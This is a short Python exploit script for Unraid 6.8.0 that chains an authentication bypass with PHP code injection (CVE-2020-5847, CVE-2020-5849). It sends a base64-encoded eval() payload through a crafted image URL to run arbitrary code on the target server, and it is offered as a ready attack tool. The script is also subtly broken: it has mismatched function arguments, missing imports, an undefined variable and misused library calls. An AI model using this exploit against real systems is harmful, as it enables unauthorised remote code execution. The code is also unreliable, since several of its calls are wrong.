# Unraid 6.8.0 - Auth Bypass PHP Code Execution
# CVE-2020-5847
# CVE-2020-5849
# https://forums.unraid.net/topic/88253-critical-security-vulnerabilies-discovered/
# https://www.exploit-db.com/exploits/48353
# Author: https://github.com/1Gould

import sys
import requests
from urllib.parse import urlparse, urlunparse, quote
import re
from http import HTTPStatus
import base64


def main(argv):
    version = "6.8.0"
    baseUrl = argv[0]
    payload = argv[1]
    targetUri = "webGui/images/green-on.png/"
    url = url_fix(baseUrl + targetUri)
    print("Checking if the version is vulnerable.\n")
    if check(url):
        print("Starting Exploit.\n")
        exploit(url, baseUrl, targetUri, payload)

    else:
        print("Quitting...")
        exit()
    return


def check(url, version):
    try:
        response = requests.get(url)
    except HTTPError as e:
        print(f"Received unexpected HTTP error: {e.code} {e.reason}")
        exit()

    match = re.search(
        r"\sVersion:\s(?P<version>\d{1,2}\.\d{1,2}\.\d{1,2})&nbsp;", response.text()
    )
    if match == version:
        print("Unraid is running version %s and is vulnerable.\n", version)
        return True
    else:
        print(
            "Target Unraid application is not vulnerable, it appears to be running version %s.\n",
            version,
        )
        return False


def url_fix(url):
    parts = urlparse(url)
    return urlunparse(parts._replace(path=quote(parts.path)))


def exploit(url, baseUrl, targetUri, payload):
    payload = base64.b64encode(payload)
    payload = f"<?php eval(base64_decode({payload}))"
    payload = urllib.parse.urlencode(payload, "hex-normal")
    try:
        response = requests.get(url, params={path: "x", "site[x][text]": payload})
        print("-----------------------")
        print(response)
        print("-----------------------")
    except HTTPError as e:
        print(f"Received unexpected HTTP error: {e.code} {e.reason}")
        exit()

    return


if __name__ == "__main__":
    main(sys.argv[1:])
